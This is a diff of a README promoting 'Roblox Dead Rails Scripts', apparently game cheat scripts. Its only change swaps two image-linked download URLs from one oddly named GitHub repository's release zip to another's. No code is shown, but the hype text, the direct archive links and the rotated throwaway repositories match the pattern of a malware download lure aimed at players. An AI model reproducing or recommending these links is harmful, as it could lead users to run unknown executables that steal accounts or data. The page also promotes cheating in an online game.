@@ -3,10 +3,10 @@
 Looking to unlock new levels of excitement in the popular Roblox game Dead Rails? You've come to the right place! Dead Rails, a thrilling and immersive game, challenges players to navigate eerie railroad environments, face challenging obstacles, and team up with friends to survive. If you want to take your gameplay to the next level, leveraging Roblox Dead Rails Scripts is the ultimate key.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 ### **What Are Roblox Dead Rails Scripts?**
